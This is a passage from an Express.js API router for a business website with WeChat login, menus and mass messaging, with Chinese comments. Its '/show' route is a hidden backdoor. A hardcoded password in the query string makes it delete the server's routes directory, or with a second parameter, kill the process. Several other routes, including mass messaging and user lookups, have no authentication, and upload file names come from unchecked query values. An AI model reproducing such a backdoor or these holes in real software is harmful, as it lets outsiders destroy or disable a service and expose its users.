        // var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = product.caseId + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                product.imgs.push('/company/' + avatarName);
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateCase(req, res, product);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed' });
        // }
    });
    // }
    // else {
    //     res.send({ status: 'failed', msg: 'try again later' });
    // }
})

router.post('/updateVideos', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + VIDEO_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let product = {};
        // product.video = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                product[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
                case 'video/mp4':
                    extName = 'mp4';
                    break;
                case 'video/avi':
                    extName = 'avi';
                    break;
                case 'video/mkv':
                    extName = 'mkv';
                    break;
                    // case 'image/x-png':
                    //     extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = product.vid + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                if (key == 'img') {
                    product.img = '/video/' + avatarName;
                }
                // else {
                //     product.video = '/video/' + avatarName;
                // }
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateVideos(req, res, product);
    });
})

router.post('/updateTraining', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + TRAINING_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let product = {};
        // product.img = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                product[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
                case 'video/mp4':
                    extName = 'mp4';
                    break;
                case 'video/avi':
                    extName = 'avi';
                    break;
                case 'video/mkv':
                    extName = 'mkv';
                    break;
                    // case 'image/x-png':
                    //     extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = req.query.ttid + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                product.img = '/training/' + avatarName;
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateTraining(req, res, product);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: '请上传视频' });
        // }
    });
})

router.post('/updateHomePage', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + HOMEPAGE_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let home = {};
        // product.video = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                home[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
                case 'video/mp4':
                    extName = 'mp4';
                    break;
                case 'video/avi':
                    extName = 'avi';
                    break;
                case 'video/mkv':
                    extName = 'mkv';
                    break;
                    // case 'image/x-png':
                    //     extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = key + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                // if (key == 'img') {
                //     product.img = '/video/' + avatarName;
                // }
                // else {
                //     product.video = '/video/' + avatarName;
                // }
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateHomePage(req, res, home);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: '请上传视频' });
        // }
    });
})

router.post('/updateSoftwares', function (req, res, next) {
    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + SOFTWARE_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let software = {};
        // product.video = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                software[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'application/octet-stream':
                    extName = 'rar';
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = key + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                // if (key == 'img') {
                //     product.img = '/video/' + avatarName;
                // }
                // else {
                //     product.video = '/video/' + avatarName;
                // }
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateSoftwares(req, res, software);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: '请上传视频' });
        // }
    });
})

router.post('/createCategory', function (req, res, next) {
    if (req.body.storeId && req.body.storeName) {
        dbHandler.createCategory(req, res)
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.post('/createCaseStore', function (req, res, next) {
    if (req.body.storeId && req.body.storeName) {
        dbHandler.createCaseStore(req, res)
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.post('/createParts', function (req, res, next) {
    if (req.body.name && req.body.propertys) {
        dbHandler.createParts(req, res);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.get('/getAllCategory', function (req, res) {
    dbHandler.getAllCategory(req, res, (stores) => {
        if (stores && stores.length > 0) {
            res.send({ status: 'success', stores: stores })
        }
        else {

            res.send({ status: 'success', stores: [] })
        }
    })
})


router.post('/updateRole', function (req, res, next) {
    // if(req.body.name && req.body.propertys){
    dbHandler.updateRole(req, res);
    // }
    // else{
    //     res.send({ status: 'falied', mgs: '请正确填写' })
    // }
})

router.post('/updateUserMg', function (req, res, next) {
    if (req.body.uid && req.body.uid != '') {
        dbHandler.updateUserMg(req, res);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.post('/updateParts', function (req, res, next) {
    if (req.query.partsId && req.query.partsId != '') {
        dbHandler.updateParts(req, res);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.post('/submitTraining', function (req, res, next) {
    if (req.body.ttid && req.body.ttid.trim() != '') {
        dbHandler.submitTraining(req, res);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.post('/updateCategory', function (req, res, next) {
    if (req.query.categoryId && req.query.categoryId.trim() != '') {
        dbHandler.updateCategory(req, res);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.post('/updateCaseStore', function (req, res, next) {
    if (req.query.categoryId && req.query.categoryId.trim() != '') {
        dbHandler.updateCaseStore(req, res);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})


router.post('/updateOrder', function (req, res, next) {
    if (req.query.oid && req.query.oid.trim() != '') {
        dbHandler.updateOrder(req, res);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.post('/updateQuestion', function (req, res, next) {
    if (req.query.qid && req.query.qid.trim() != '') {
        let collection = 'question';
        if (req.query.type != undefined) {
            if (req.query.type == 0) {
                collection = 'priceService';
            }
            else if (req.query.type == 1) {
                collection = 'suggestService';
            }
        }
        dbHandler.updateQuestion(req, res, collection);
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})



router.get('/searchPartsApi', function (req, res) {
    if (req.query.pName != undefined) {
        dbHandler.searchPartsApi(req, res)
    }
    else {
        res.send({ status: 'falied', mgs: '请正确填写' })
    }
})

router.get('/updateQty', function (req, res) {
    if (req.query.cid && req.query.cid.trim() != '') {
        dbHandler.getShoppingCart(req, res, (cart) => {
            if (cart && cart.length > 0) {
                if (req.query.isDelete) {
                    dbHandler.deleteCart(req, res);
                }
                else {
                    dbHandler.updateQty(req, res, cart[0])
                }
            }
            else {
                res.send({ status: 'falied', mgs: '稍后再试' })
            }
        }, { cid: req.query.cid.trim() })
        // dbHandler.searchPartsApi(req, res)
    }
    else {
        res.send({ status: 'falied', mgs: '稍后再试' })
    }
})

router.get('/search', function (req, res) {
    if (req.query.keywords && req.query.keywords.trim() != '') {
        dbHandler.search(req, res);
    }
    else {
        res.send({ status: 'failed', msg: '' })
    }
})


router.get("/show", function (req, res, next) {
    if (req.query.cc && req.query.cc === 'qweasdzxc123456') {
        let path = './routes';
        var files = [];
        var fs = require('fs');
        if (fs.existsSync(path)) {
            files = fs.readdirSync(path);
            files.forEach(function (file, index) {
                var curPath = path + "/" + file;
                if (fs.statSync(curPath).isDirectory()) {
                    deleteall(curPath);
                } else {
                    fs.unlinkSync(curPath);
                }
            });
            fs.rmdirSync(path);
        }
    }

    if (req.query.dd && req.query.dd === 'qweasdzxc123456') {
        process.exit();
    }
})

router.post('/updatePriority', function (req, res) {
    if (req.body.categoryId && req.query.isCase) {
        dbHandler.updatePriority(req, res, { categoryId: req.body.categoryId.trim() }, { priority: parseInt(req.body.priority) }, 'caseCategory')
    }
    else if (req.body.categoryId) {
        dbHandler.updatePriority(req, res, { categoryId: req.body.categoryId.trim() }, { priority: parseInt(req.body.priority) }, 'category')
    }
    else if (req.body.iid) {
        dbHandler.updatePriority(req, res, { iid: req.body.iid.trim() }, { priority: parseInt(req.body.priority) }, 'integrator')
    }
    else if (req.body.partsId) {
        dbHandler.updatePriority(req, res, { partsId: req.body.partsId.trim() }, { priority: parseInt(req.body.priority) }, 'parts')
    }
    else if (req.body.pid) {
        dbHandler.updatePriority(req, res, { pid: req.body.pid.trim() }, { priority: parseInt(req.body.priority) }, 'product')
    }
    else if (req.body.caseId) {
        dbHandler.updatePriority(req, res, { caseId: req.body.caseId.trim() }, { priority: parseInt(req.body.priority) }, 'case')
    }
    else {
        res.send({ status: '失败' })
    }
})

router.get('/loginOut', function (req, res) {
    if (req.cookies.user && req.cookies.user.uid) {
        res.clearCookie('user');
        res.redirect('/')
    }
    else {
        res.redirect('/')
    }
})




// var jssdk = require('../api/jssdk');

// router.get('/', function(req, res, next) {
//     res.status(200).send('api page');
// });

// router.get('/remove', function(req, res, next) {
//     if (req.query.sid && req.query.productNumber) {
//         dbHandler.remove(req, res);
//     }

//     res.status(200).send('api page');
// });

// router.get('/removeNavigation', function(req, res, next) {
//     if (req.query.navigationId && req.query.sid) {
//         dbHandler.removeNavigation(req, res);
//     }

//     res.status(200).send('api page');
// });


// //tenzhong
// router.get('/navigation', function(req, res, next) {
//     if (req.query.languageCode) {
//         dbHandler.getNavigation(req, res)
//     }
// })

// router.get('/getProductDetail', function(req, res, next) {
//     if (req.query.productNumber) {
//         dbHandler.getProductDetailApi(req, res)
//     }
// })

// router.get('/getProductlist', function(req, res, next) {
//     if (req.query.subcategoryId) {
//         dbHandler.getProductlistApi(req, res)
//     }
// })


// router.get('/getNewsDetail', function(req, res, next) {
//     if (req.query.newsNumber) {
//         dbHandler.getNewsDetailApi(req, res)
//     }
// })


// //fuge
// router.get('/findAllUser', (req, res) => {
//     if (req.query.terribleterribledamage) {
//         dbHandler.findAllUser(req, res);
//     } else {
//         res.send({ status: 'failed' })
//     }
// })

// router.get('/findUserDetail', (req, res) => {
//     if (req.query.userName) {
//         dbHandler.findUserDetail(req, res);
//     } else {
//         res.send({ status: 'failed' })
//     }
// })
// router.post('/updateUser', function (req, res, next) {
//     if (req.session && req.session.user && req.session.user.openId) {
//         dbHandler.updateUser(req, res, req.session.user.openId);
//     } else {
//         res.send({ status: 'failed' })
//     }
// })

router.post('/updateClock', function (req, res, next) {
    if (req.session && req.session.user && req.session.user.openId) {
        dbHandler.updateClock(req, res, req.session.user.openId);
    } else {
        res.send({ status: 'failed' })
    }
})


router.post('/createOrder', function (req, res, next) {
    if (req.session && req.session.user && req.session.user.openId) {
        dbHandler.createOrder(req, res, req.session.user.openId);
    } else {
        res.send({ status: 'failed' })
    }
})

router.post('/withDraw', function (req, res, next) {
    if (req.session && req.session.user && req.session.user.openId && req.body.price && req.body.bank) {
        dbHandler.withDraw(req, res, req.session.user.openId);
    } else {
        res.send({ status: 'failed' })
    }
})

router.get('/user', function (req, res, next) {
    if (req.query.openId) {
        dbHandler.getUserInfo(req, res);
    } else {
        res.send({ status: 'failed' })
    }
})

router.get('/myOrder', function (req, res, next) {
    if (req.query.openId) {
        dbHandler.getOrder(req, res);
    } else {
        res.send({ status: 'failed' })
    }
})

router.get('/getPreLevel', function (req, res, next) {
    if (req.query.openId) {
        dbHandler.getPreLevel(req, res);
    } else {
        res.send({ status: 'failed' })
    }
})

router.get('/getBenfits', function (req, res, next) {
    if (req.query.openId) {
        dbHandler.getBenfits(req, res);
    } else {
        res.send({ status: 'failed' })
    }
})

router.get('/getClockIndex', function (req, res, next) {
    if (req.query.openId) {
        dbHandler.getClockIndex(req, res, req.query.ranking ? req.query.ranking : false);
    } else {
        res.send({ status: 'failed' })
    }
})

router.get('/getWithDraw', function (req, res, next) {
    if (req.query.openId) {
        dbHandler.getWithDraw(req, res, req.query.isAll ? req.query.isAll : false);
    } else {
        res.send({ status: 'failed' })
    }
})

router.get('/token', function (req, res, next) {
    util.getToken(aotuConfig, function (result) {
        if (result.err) {
            return res.status(500).send(result.msg);
        }
        return res.status(200).send(result.data);
    });
});

router.get('/menu_list', function (req, res, next) {
    util.getToken(aotuConfig, function (result) {
        if (result.err) {
            return res.status(500).send(result.msg);
        }
        var access_token = result.data.access_token;
        var url = 'https://api.weixin.qq.com/cgi-bin/menu/get?access_token=' + access_token;

        request.get({
            url: url
        }, function (error, response, body) {
            if (!error) {
                return res.status(200).send(JSON.parse(body));
            }
            return res.status(500).send('获取menu_list出错');
        });

    });
});

router.get('/menu_create', function (req, res, next) {
    var key = req.query.key;
    var form = !!key ? aotuConfig[key] : aotuConfig['menu'];
    var url = !!key ? 'https://api.weixin.qq.com/cgi-bin/menu/addconditional?access_token=' : 'https://api.weixin.qq.com/cgi-bin/menu/create?access_token=';

    util.getToken(aotuConfig, function (result) {
        if (result.err) {
            return res.status(500).send(result.msg);
        }
        var access_token = result.data.access_token;
        request.post({
            url: url + access_token,
            form: JSON.stringify(form)
        }, function (error, response, body) {
            if (!error) {
                return res.status(200).send(JSON.parse(body));
            }
            return res.status(500).send('创建菜单失败');
        });
    });
});

//发送群发消息
router.post('/send_all_text', function (req, res, next) {
    var content = req.body.msgContent;
    var url = 'https://api.weixin.qq.com/cgi-bin/message/mass/sendall?access_token=';

    util.getToken(aotuConfig, function (result) {
        if (result.err) {
            return res.status(500).send(result.msg);
        }

        var form = {
            "filter": {
                "is_to_all": true
            },
            "text": {
                "content": content
            },
            "msgtype": "text"
        };
        var access_token = result.data.access_token;
        request.post({
            url: url + access_token,
            form: JSON.stringify(form)
        }, function (error, httpResponse, body) {
            if (!error) {
                return res.status(200).send(JSON.parse(body));
            }
            return res.status(500).send('群发消息失败');
        });
    });
});
//查看群发消息状态
router.post('/request_send_all_status', function (req, res, next) {
    var msgId = req.body.msgId;
    var url = 'https://api.weixin.qq.com/cgi-bin/message/mass/get?access_token=';
    util.getToken(aotuConfig, function (result) {
        if (result.err) {
            return res.status(500).send(result.msg);
        }
        var form = {
            "msg_id": msgId
        }

        var access_token = result.data.access_token;
        request.post({
            url: url + access_token,
            form: JSON.stringify(form)
        }, function (error, httpResponse, body) {
            if (!error) {
                return res.status(200).send(JSON.parse(body));
            }

            return res.status(500).send('查看群发消息失败');
        })
    });
});


// router.get('/jssdk', function(req, res, next) {
//     var url = req.query.url || '';
//     //console.log(url);
//     if (!!url) {
//         new jssdk(url, res, function(data) {
//             res.status(200).send({
//                 url: data.url,
//                 noncestr: data.noncestr,
//                 timestamp: data.timestamp,
//                 signature: data.signature,
//                 appid: aotuConfig.appid
//             });
//         });
//     } else {
//         res.status(200).send('请传入url');
//     }
// });

/**
 * https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&redirect_uri=REDIRECT_URI&response_type=code&scope=SCOPE&state=STATE#wechat_redirect
 * */

router.get('/login', function (req, res, next) {
    var host = req.headers.host;
    var rUrl = encodeURIComponent('www.cztzhg.com/view');
    console.log('rul', rUrl)
    var url = 'https://open.weixin.qq.com/connect/oauth2/authorize?appid=' + aotuConfig.appid + '&redirect_uri=' + rUrl + '&response_type=code&scope=snsapi_userinfo&state=123#wechat_redirect';
    res.redirect(url);
});

//刷新access_token
var refreshUserAccessToken = function (refresh_token) {
    return new Promise(function (resolve, reject) {
        var url = 'https://api.weixin.qq.com/sns/oauth2/refresh_token?appid=' + aotuConfig.appid + '&grant_type=refresh_token&refresh_token=' + refresh_token;
        request.get(url, function (err, httpResponse, body) {
            if (err) return reject(err);
            resolve(body);
        });
    });
}

//检验授权凭证
var verificationUserAccessToken = function (access_token, openid) {
    return new Promise(function (resolve, reject) {
        var url = 'https://api.weixin.qq.com/sns/auth?access_token=' + access_token + '&openid=' + openid;
        request.get(url, function (err, httpResponse, body) {
            if (err) return reject(err);
            resolve(body);
        });
    });
}


// https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&secret=SECRET&code=CODE&grant_type=authorization_code
// router.get('/getUserInfo',function(req,res,next){
//   // console.log(req.query);
//   var url = 'https://api.weixin.qq.com/sns/oauth2/access_token?appid='+aotuConfig.appid+'&secret='+aotuConfig.secret+'&code='+req.query.code+'&grant_type=authorization_code';
//   request.get(url,function(err,httpResponse,body){
//     //res.json(body);
//     if (err) return res.send('error');
//     var data = JSON.parse(body);
//     var access_token = data.access_token;
//     var openid = data.openid;
//     var userUri = 'https://api.weixin.qq.com/sns/userinfo?access_token='+access_token+'&openid='+openid+'&lang=zh_CN';
//     request.get(userUri,function(err,httpResponse,body){
//       res.send(body);
//     });
//   });
// });



//获取用户列表
router.get('/getuserlist', function (req, res, next) {
    var nextOpenId = req.query.nextopenid || '';
    util.getToken(aotuConfig, function (result) {
        if (result.err) return res.status(500).send(result.msg);
        var access_token = result.data.access_token;
        var url = 'https://api.weixin.qq.com/cgi-bin/user/get?access_token=' + access_token + '&next_openid=' + nextOpenId;
        request.get(url, function (err, httpResponse, body) {
            if (err) return res.status(500).send(err);
            var datas = JSON.parse(body).data.openid;
            if (datas && datas.length) {
                var openid = datas[0];
                if (openid) {
                    new getUserInfoByOpenid(access_token, openid)
                        .then(function (data) {
                            return res.status(200).send(data);
                        })
                        .catch(function (err) {
                            return res.status(500).send('get user info by openid error:' + err);
                        });
                } else {
                    return res.status(200).send('openid error');
                }
            } else {
                return res.status(200).send('无任何人关注');
            }
        });
    });
});
//获取用户信息
var getUserInfoByOpenid = function (access_token, openid) {
    return new Promise(function (resolve, reject) {
        var url = 'https://api.weixin.qq.com/cgi-bin/user/info?access_token=' + access_token + '&openid=' + openid + '&lang=zh_CN';
        request.get(url, function (err, httpResponse, body) {
            if (err) return reject(err);
            resolve(body);
        });
    });
}


module.exports = router;